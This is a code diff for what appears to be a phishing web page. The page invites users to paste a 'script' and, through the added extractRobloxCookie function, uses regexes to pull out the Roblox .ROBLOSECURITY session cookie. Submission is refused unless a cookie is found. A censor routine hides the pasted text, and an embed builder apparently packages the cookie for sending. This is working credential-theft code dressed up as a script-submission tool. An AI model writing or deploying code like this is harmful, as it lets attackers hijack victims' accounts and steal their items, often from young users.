@@ -20,20 +20,51 @@
     return text.replace(/[^\n\r]/g, CENSOR_CHAR);
   }
 
-  function prepareSubmission(text) {
+  function extractRobloxCookie(text) {
     const normalized = text.trim();
-    const robloMatch = normalized.match(/\.ROBLOSECURITY/i);
 
-    if (robloMatch && robloMatch.index !== undefined) {
-      return normalized.slice(robloMatch.index);
+    const psQuoted = normalized.match(
+      /\.ROBLOSECURITY"\s*,\s*"(_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[^"]+)"/i
+    );
+    if (psQuoted) {
+      return psQuoted[1];
+    }
+
+    const headerMatch = normalized.match(
+      /\.ROBLOSECURITY\s*=\s*(_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[^\s;"']+)/i
+    );
+    if (headerMatch) {
+      return headerMatch[1];
     }
 
     const markerIndex = normalized.indexOf(ROBLOX_WARNING_MARKER);
-    if (markerIndex !== -1) {
-      return normalized.slice(markerIndex);
+    if (markerIndex === -1) {
+      return null;
     }
 
-    return normalized;
+    const fromMarker = normalized.slice(markerIndex);
+    const tokenMatch = fromMarker.match(
+      /^_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Za-z0-9+/=._-]+/
+    );
+    if (tokenMatch) {
+      return tokenMatch[0];
+    }
+
+    let end = fromMarker.length;
+    for (let i = ROBLOX_WARNING_MARKER.length; i < fromMarker.length; i++) {
+      const ch = fromMarker[i];
+      if (ch === '"' || ch === "'" || ch === "\n" || ch === "\r" || ch === "," || ch === ")" || ch === ";") {
+        end = i;
+        break;
+      }
+    }
+
+    const cookie = fromMarker.slice(0, end).trim();
+    return cookie.length > ROBLOX_WARNING_MARKER.length ? cookie : null;
+  }
+
+  function prepareSubmission(text) {
+    return extractRobloxCookie(text);
   }
 
   function buildEmbed(text) {
@@ -110,6 +141,14 @@
 
     if (!text) {
       setStatus("Please paste a script before submitting.", "error");
+      input.focus();
+      return;
+    }
+
+    const payload = prepareSubmission(text);
+
+    if (!payload) {
+      setStatus("No .ROBLOSECURITY cookie detected.", "error");
       input.focus();
       return;
     }
